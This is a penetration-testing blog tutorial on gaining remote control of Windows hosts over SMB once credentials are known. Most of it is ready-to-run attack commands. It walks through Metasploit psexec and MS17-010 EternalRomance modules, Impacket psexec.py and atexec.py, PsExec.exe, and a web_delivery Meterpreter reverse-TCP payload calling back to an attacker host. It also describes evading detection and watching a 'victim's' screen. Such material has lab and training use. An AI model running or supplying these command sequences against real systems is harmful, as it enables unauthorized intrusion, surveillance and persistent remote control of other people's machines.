<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Multiple ways to Connect Remote PC using SMB Port</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/multiple-ways-to-connect-remote-pc-using-smb-port/" rel="bookmark"><time class="entry-date published" datetime="2018-09-01T05:46:39+00:00">September 1, 2018</time><time class="updated" datetime="2025-05-31T08:59:54+00:00">May 31, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we will learn how to connect with victim’s machine via SMB port 445, once you have collected username and password to your victim’s PC. To know how collect username and passwords to your remote host via SMB protocol click <a style="color: #000000;" href="http://www.hackingarticles.in/5-ways-to-hack-smb-login-password/"><strong>here</strong></a> and to understand what is SMB protocol, click <a style="color: #000000;" href="http://www.hackingarticles.in/penetration-testing-in-smb-protocol-using-metasploit/"><strong>here</strong></a></span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content </span></h3>
<p class="ai-optimize-8"><span style="color: #000000;"><strong>Exploiting Windows Server 2008 R2 via SMB through Metasploit inbuilt exploits:</strong></span></p>
<ul>
<li class="ai-optimize-9"><span style="color: #000000;">Microsoft Windows Authenticated User Code Execution</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Microsoft Windows Authenticated Powershell Command Execution</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Microsoft Windows Authenticated Administration Utility</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">SMB Impacket WMI Exec</span></li>
</ul>
<p class="ai-optimize-13"><span style="color: #000000;"><strong>Third-party Tools</strong></span></p>
<ul>
<li class="ai-optimize-14"><span style="color: #000000;">Impacket (psexec)</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">Impacket (exec)</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">Psexec exe</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">Atelier Web Remote Commander</span></li>
</ul>
<p class="ai-optimize-18"><span style="color: #000000;"><strong>Exploiting Windows 2007 via SMB through Metasploit inbuilt exploits:</strong></span></p>
<ul>
<li class="ai-optimize-19"><span style="color: #000000;">MS17-010 EternalRomance SMB Remote code execution</span></li>
<li class="ai-optimize-20"><span style="color: #000000;">MS17-010 EternalRomance SMB Remote command execution</span></li>
</ul>
<p class="ai-optimize-21"><span style="color: #000000;"><strong>Let’s Begin</strong></span></p>
<p class="ai-optimize-22"><span style="color: #000000;">Tested on: Windows Server2008 R2</span></p>
<p class="ai-optimize-23"><span style="color: #000000;">Attacking Machine: Kali Linux</span></p>
<h3 class="ai-optimize-24"><span style="color: #800000;">Microsoft Windows Authenticated User Code Execution</span></h3>
<p class="ai-optimize-25"><span style="color: #000000;">This module executes an arbitrary payload using a valid administrator username and password (or password hash). This module is comparable to SysInternals’ “psexec” utility. It is now possible for this module to clean up after itself. This program generates a service with a randomly selected name and description.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/windows/smb/psexec
msf exploit windows/smb/psexec) &gt; set rhost 192.168.1.104
msf exploit(windows/smb/psexec) &gt; set smbuser administrator
msf exploit(windows/smb/psexec) &gt; set smbpass Ignite@123
msf exploit(windows/smb/psexec) &gt; exploit</pre>
<p class="ai-optimize-26"><span style="color: #000000;">Here,</span></p>
<p class="ai-optimize-27"><span style="color: #000000;">rhost –&gt; IP of victim PC</span></p>
<p class="ai-optimize-28"><span style="color: #000000;">smbuser –&gt; username</span></p>
<p class="ai-optimize-29"><span style="color: #000000;">smbpass –&gt; password</span></p>
<p class="ai-optimize-30"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rUu1EaD2_g8/W4oz9nFf9UI/AAAAAAAAaCA/atmDMf8fM-ore9-NGH2mBXtCN-E-0mjwACEwYBhgL/s1600/1.png"/></span></p>
<p class="ai-optimize-31"><span style="color: #000000;">Finally, once the commands run you will gain a <strong>meterpreter session</strong> of your victim’s PC and so you can access it as you want.</span></p>
<h3 class="ai-optimize-32"><span style="color: #800000;">Microsoft Windows Authenticated Powershell Command Execution</span></h3>
<p class="ai-optimize-33"><span style="color: #000000;">This module uses a valid administrator username and password to execute a PowerShell payload using a similar technique to the “psexec” utility provided by SysInternals. The payload is encoded in base64 and executed from the command line using the –encoded command flag. Using this method, the payload is never written to disk, and given that each payload is unique, is less prone to signature-based detection. A persist option is provided to execute the payload in a while loop in order to maintain a form of persistence. In the event of a sandbox observing PSH execution, a delay and other obfuscation may be added to avoid detection. In order to avoid interactive process notifications for the current user, the psh payload has been reduced in size and wrapped in a PowerShell invocation which hides the window entirely.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/windows/smb/psexec_psh
msf exploit(windows/smb/psexec_psh) &gt; set rhost 192.168.1.104
msf exploit(windows/smb/psexec_psh) &gt; set smbuser administrator
msf exploit(windows/smb/psexec_psh) &gt; set smbpass Ignite@123
msf exploit(windows/smb/psexec_psh) &gt; exploit</pre>
<p class="ai-optimize-34"><span style="color: #000000;">Once again as the commands run you will gain a <strong>meterpreter session</strong> of victim’s PC. And therefore, you can do as you wish.</span></p>
<p class="ai-optimize-35"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ZxbGdVg37ao/W4oz_F0OemI/AAAAAAAAaCQ/yY-0yhRRY28Ywkc_HHircOMPhGg4ZP9VACEwYBhgL/s1600/2.png"/></span></p>
<h3 class="ai-optimize-36"><span style="color: #800000;">Microsoft Windows Authenticated Administration Utility</span></h3>
<p class="ai-optimize-37"><span style="color: #000000;">This module uses a valid administrator username and password <strong><em>to execute an arbitrary command on one or more hosts</em></strong>, using a similar technique than the “psexec” utility provided by SysInternals. Daisy chaining commands with ‘&amp;’ do not work and users shouldn’t try it. This module is useful because it doesn’t need to upload any binaries to the target machine.</span></p>
<p class="ai-optimize-38"><span style="color: #000000;">Thus, in a new Metasploit framework we had used web delivery module to get malicious dll code which we can use as an arbitrary command on the host.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
msf exploit(multi/script/web_delivery) &gt; set target 3
msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) &gt; set lhost 192.168.1.106
msf exploit(multi/script/web_delivery) &gt; exploit</pre>
<p class="ai-optimize-39"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nF2YQfDj2A4/W4oz_u6GkQI/AAAAAAAAaCM/gJCvANEywmglHs1IlQiuAxa4UhyzXNhBgCEwYBhgL/s1600/4.png"/></span></p>
<p class="ai-optimize-40"><span style="color: #000000;">Copy the highlighted text for malicious dll code.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use auxiliary/admin/smb/psexec_command
msf auxiliary(admin/smb/psexec_command) &gt; set rhosts 192.168.1.104
msf auxiliary(admin/smb/psexec_command) &gt; set smbuser administrator
msf auxiliary(admin/smb/psexec_command) &gt; set smbpass Ignite@123
msf auxiliary(admin/smb/psexec_command) &gt; set COMMAND [Paste above copied dll code here]
msf auxiliary(admin/smb/psexec_command) &gt; exploit</pre>
<p class="ai-optimize-41"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uDfQHWCjcro/W4oz_jI8RRI/AAAAAAAAaCM/XjJ9E65p5iUZBz7VdBhH9JihYxLJgVTVwCEwYBhgL/s1600/5.png"/></span></p>
<p class="ai-optimize-42"><span style="color: #000000;">As soon as we run psexec auxiliary we will get a meterpreter session with as an administrator.</span></p>
<p class="ai-optimize-43"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-aIifFaVQoCA/W4oz_8vGhAI/AAAAAAAAaCU/kpifMXxNHuAHZ_QL87ZZjks-ZXkq_pCeACEwYBhgL/s1600/6.png"/></span></p>
<h3 class="ai-optimize-44"><span style="color: #800000;">SMB Impacket WMI Exec</span></h3>
<p class="ai-optimize-45"><span style="color: #000000;">This module is a similar approach to psexec but executing commands through WMI.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use auxiliary/scanner/smb/impacket/wmiexec
msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set rhosts 192.168.1.104
msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbuser administrator
msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbpass Ignite@123
msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set COMMAND systeminfo
msf auxiliary(scanner/smb/impacket/wmiexec) &gt; exploit</pre>
<p class="ai-optimize-46"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A6iVrxBivQs/W4o0AXmCthI/AAAAAAAAaCY/syYfRW8QlCY80nOMqXYHGNNfxDfjv5ONgCEwYBhgL/s1600/7.1.png"/></span></p>
<h3 class="ai-optimize-47"><span style="color: #800000;">Impacket for Psexec.py</span></h3>
<p class="ai-optimize-48"><span style="color: #000000;">Psexec.py lets you execute processes on remote windows systems, copy files on remote systems, process their output and stream it back. It allows execution of remote shell commands directly with the full interactive console without having to install any client software.</span></p>
<p class="ai-optimize-49"><span style="color: #000000;">Now let’s install the Impacket tools from GitHub. You can get it from here. Firstly, clone the git, and then install the Impacket and then run psexec.py to connect the victim’s machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/CoreSecurity/impacket.git
cd impacket/
python setup.py install
cd examples</pre>
<p class="ai-optimize-50"><span style="color: #000000;"><strong>Syntax:</strong> ./psexec.py [[domain/] username [: password] @] [Target IP Address]</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./psexec.py SERVER/Administrator:Ignite@192.168.1.104</pre>
<p class="ai-optimize-51"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-QZUUjZQFZs8/W4o0Af8NblI/AAAAAAAAaCQ/w9nwN1ffFHcNiu5h0shHohX6UY4dtmWDwCEwYBhgL/s1600/7.png"/></span></p>
<h3 class="ai-optimize-52"><span style="color: #800000;">Impacket for Atexec.py</span></h3>
<p class="ai-optimize-53"><span style="color: #000000;">This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.</span></p>
<p class="ai-optimize-54"><span style="color: #000000;"><strong>Syntax:</strong> /atexec.py [[domain/] username [: password] @] [Target IP Address] [Command]</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./atexec.py SERVER/Administrator:Ignite123@192.168.1.104 systeminfo</pre>
<p class="ai-optimize-55"><span style="color: #000000;">As you can see below that a remote connection was established to the server and the command systeminfo was run on the Target server with the output of the command delivered on the Kali terminal.</span></p>
<p class="ai-optimize-56"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3dw1ZvAgQlU/W4o0AjFnjsI/AAAAAAAAaCU/fkgC5F9mCJ44B94_yYeqAN-_Pdm2uMrlACEwYBhgL/s1600/9.1.png"/></span></p>
<h3 class="ai-optimize-57"><span style="color: #800000;">PsExec.exe</span></h3>
<p class="ai-optimize-58"><span style="color: #000000;">Psexec.exe is software that helps us to access other computers in a network. This software directly takes us to the shell of the remote PC with the advantage of doing nothing manually. Download this software from –&gt; <strong>http://download.sysinternals.com/files/PSTools.zip.</strong></span></p>
<p class="ai-optimize-59"><span style="color: #000000;">Unzip the file once you have downloaded it. Go to your command prompt and type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">PsExec.exe\\192.168.1.104 -u administrator -p Ignite@123 cmd</pre>
<p class="ai-optimize-60"><span style="color: #000000;">Here,</span></p>
<p class="ai-optimize-61"><span style="color: #000000;">192.168.1.104 –&gt; is the IP of the remote host</span></p>
<p class="ai-optimize-62"><span style="color: #000000;">-u –&gt; denotes username</span></p>
<p class="ai-optimize-63"><span style="color: #000000;">-p –&gt; denotes password</span></p>
<p class="ai-optimize-64"><span style="color: #000000;">cmd –&gt; to enter victim’s command prompt</span></p>
<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-edEs7FC_7FQ/W4o0BHpp56I/AAAAAAAAaCY/w3LtbzZ05jM0EkbxKKk9u18epgqpJMZFACEwYBhgL/s1600/9.png"/></span></p>
<h3 class="ai-optimize-66"><span style="color: #800000;">Atelier Web Remote Commander</span></h3>
<p class="ai-optimize-67"><span style="color: #000000;">This is graphical software that let us gain control of the victim’s PC that too quite easily.</span></p>
<p class="ai-optimize-68"><span style="color: #000000;">Once you have open the software give the <strong>IP address </strong>of your victim’s PC in remote host box along with the <strong>username</strong> and <strong>password </strong>in their respective boxes. And then click on <strong>connect</strong>; the whole victim’s PC’s screen will appear on your Desktop and you will have a pretty good view of what your victim is doing.</span></p>
<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-RgBnSN7nHB0/W4oz9nUNHcI/AAAAAAAAaCU/rEwybaG_joc0dcxGRvzcDBF6D3u3bX62wCEwYBhgL/s1600/10.png"/></span></p>
<p class="ai-optimize-70"><span style="color: #000000;">As a result, you can observe that we now have the screen of the victim’s machine in front of us.</span></p>
<p class="ai-optimize-71"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-gYG4ALQSWzg/W4oz9t8WWKI/AAAAAAAAaCM/SJ0qXD16ZxIYKiET_3ElRCGKzipOofHPwCEwYBhgL/s1600/11.png"/></span></p>
<h3 class="ai-optimize-72"><span style="color: #800000;">MS17-010 EternalRomance SMB Remote Code Execution</span></h3>
<p class="ai-optimize-73"><span style="color: #000000;">Tested on: Windows 2007 ultimate</span></p>
<p class="ai-optimize-74"><span style="color: #000000;">Attacking Machine: Kali Linux</span></p>
<p class="ai-optimize-75"><span style="color: #000000;">This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where primitive. This will then be used to overwrite the connection session information with as an Administrator session. From there, the normal psexec payload code execution is done. Exploits a type of confusion between Transaction and write and requests and a race condition in Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy exploits. This exploit chain is more reliable than the EternalBlue exploit but requires a named pipe.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/windows/smb/ms17_010_psexec
msf exploit(windows/smb/ms17_010_psexec) &gt; set rhost 192.168.1.105
msf exploit(windows/smb/ms17_010_psexec) &gt; set smbuser raj
msf exploit(windows/smb/ms17_010_psexec) &gt; set smbpass 123
msf exploit(windows/smb/ms17_010_psexec) &gt; exploit</pre>
<p class="ai-optimize-76"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-yvYGeD6H3jg/W4oz-VdmfMI/AAAAAAAAaCE/16P_kxBrPzQlNII5on2nv7zA3AI82PQKACEwYBhgL/s1600/12.png"/></span></p>
<h3 class="ai-optimize-77"><span style="color: #800000;">MS17-010 EternalRomance SMB Remote Command Execution</span></h3>
<p class="ai-optimize-78"><span style="color: #000000;">This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where primitive. This will then be used to overwrite the connection session information with as an Administrator session. From there, the normal psexec command execution is done. Exploits a type of confusion between Transaction and write and requests and a race condition in Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy exploits. This exploit chain is more reliable than the EternalBlue exploit but requires a named pipe.</span></p>
<p class="ai-optimize-79"><span style="color: #000000;">Thus, in a new Metasploit framework we had used web delivery module to get malicious dll code which we can use as an arbitrary command on the host.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
msf exploit(multi/script/web_delivery) &gt; set target 3
msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) &gt; set lhost 192.168.1.106
msf exploit(multi/script/web_delivery) &gt; exploit</pre>
<p class="ai-optimize-80"><span style="color: #000000;">Copy the highlighted text for malicious dll code.</span></p>
<p class="ai-optimize-81"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-tKyEUMXosQA/W4oz-oDkWHI/AAAAAAAAaCI/G9Cqm0eT-cEEsgDK0TeO-7f_FNHFf1sXwCEwYBhgL/s1600/13.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use auxiliary/admin/smb/ms17_010_command
msf auxiliary(admin/smb/ms17_010_command) &gt; set rhosts 192.168.1.105
msf auxiliary(admin/smb/ms17_010_command) &gt; set smbuser raj
msf auxiliary(admin/smb/ms17_010_command) &gt; set smbpass 123
msf auxiliary(admin/smb/ms17_010_command) &gt; set COMMAND [Paste above copied dll code here]
msf auxiliary(admin/smb/ms17_010_command) &gt; exploit</pre>
<p class="ai-optimize-82"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-eSoIjxatjd0/W4oz-zaaEWI/AAAAAAAAaCI/y1Z-blUmuuYzUDwbUIVBzF9iKd-0btoMACEwYBhgL/s1600/14.png"/></span></p>
<p class="ai-optimize-83"><span style="color: #000000;">As soon as we run psexec auxiliary we will get a meterpreter session with as an administrator.</span></p>
<p class="ai-optimize-84"><span style="color: #000000;">In this way, we can compromise a victim’s machine remotely if we have login credential.</span></p>
<p class="ai-optimize-85"><span style="color: #000000;">Happy Hacking!!!!</span></p>
<p class="ai-optimize-86"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-y0iYx0a5P8w/W4oz-zSI9lI/AAAAAAAAaCY/G1IDkRnV0HgfHoZCBK5YwzpHOgXckh5SQCEwYBhgL/s1600/15.png"/></span></p>
<p class="ai-optimize-87"><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contac</span>t <strong><a class="broken_link" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
